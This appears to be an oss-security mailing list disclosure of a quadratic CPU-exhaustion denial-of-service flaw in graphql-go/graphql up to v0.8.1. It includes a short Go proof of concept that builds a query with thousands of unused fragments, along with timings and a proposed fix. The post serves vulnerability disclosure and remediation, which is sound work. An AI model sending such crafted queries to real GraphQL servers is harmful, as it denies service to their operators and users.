X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/26/16
Message-ID: <CAK=gNzqFv7qQ7Y6Nw7Na4tJX-oDFFAmOgbhipBuTt_okpCZRmg@mail.gmail.com>
Date: Wed, 26 Aug 2026 18:22:12 +0200
From: First name Last name <0x6675636b736f6369617479@...il.com>
To: oss-security@...ts.openwall.com
Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS via per-error full-document rescan (GetLocation)
Content-Type: text/plain; charset=utf-8

Hello,

This reports an algorithmic-complexity denial-of-service defect in
github.com/graphql-go/graphql, affecting all released versions up to and
including the latest, v0.8.1. No fixed version exists. It is
unauthenticated, network-reachable, triggered purely by attacker-controlled
query text, and requires no special configuration. Reproduced against the
published v0.8.1 module fetched from the Go module proxy.

== Affected ==

  Product:  github.com/graphql-go/graphql
  Versions: all <= v0.8.1; no fix available
  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)


== Details ==

The helper language/location.GetLocation converts a byte offset to a
line/column for error messages. On every call it recompiles a regexp and
rescans the ENTIRE source document from the beginning to locate line breaks:

    func GetLocation(s *source.Source, position int) SourceLocation {
        ...
        lineRegexp := regexp.MustCompile("\r\n|[\n\r]")  // recompiled
every call
        matches := lineRegexp.FindAllIndex(body, -1)      // rescans whole
body
        ...
    }

GetLocation is called once per reported error from reportError (invoked by
nearly every validation rule, once per offending element) and from
handleFieldError during execution. Each call is O(document_size); N errors
cost O(N * document_size). Because a query with N invalid elements is
itself O(N) in size, total cost is O(n^2) in request size. Any rule that
reports one error per element is a valid trigger.


== Proof of concept ==

Public API; a trivial one-field schema and a query with many unused
fragment definitions (each triggers one NoUnusedFragments validation error):

    package main

    import (
        "fmt"
        "strings"
        "github.com/graphql-go/graphql"
    )

    func main() {
        queryType := graphql.NewObject(graphql.ObjectConfig{
            Name:   "Query",
            Fields: graphql.Fields{"hello": &graphql.Field{Type:
graphql.String}},
        })
        schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query:
queryType})

        const N = 2000
        var b strings.Builder
        b.WriteString("{ hello }\n")
        for i := 0; i < N; i++ {
            fmt.Fprintf(&b, "fragment F%d on Query { hello }\n", i)
        }
        graphql.Do(graphql.Params{Schema: schema, RequestString:
b.String()})
    }

Measured wall-clock against v0.8.1 (clean quadratic scaling, each 2x in
error count is ~4-5x in time):

    N=500  -> 0.38 s
    N=1000 -> 1.57 s
    N=2000 -> 8.49 s
    N=4000 -> ~38 s   (request ~150 KB)

== Impact ==

A single unauthenticated request of a few hundred KB consumes many seconds
of server CPU; a small number of concurrent such requests saturates the
worker pool and denies service. Triggered by ordinary query text over the
network, no authentication and no special configuration. The same path also
runs during normal execution (handleFieldError), so a large,
non-adversarial query in which many nullable fields error pays the same
quadratic cost.

== Remediation ==

No fixed release exists. Precompute a sorted index of newline byte offsets
per source.Source once (O(n)), cache it on the Source, and have GetLocation
binary-search that index (O(log n)) instead of rescanning the whole
document per call. (Hoisting regexp.MustCompile to a package-level var
alone is insufficient, it removes recompilation but not the O(n) scan.)

== Credit ==

  William Carrier, independent security researcher.

Sincerely,

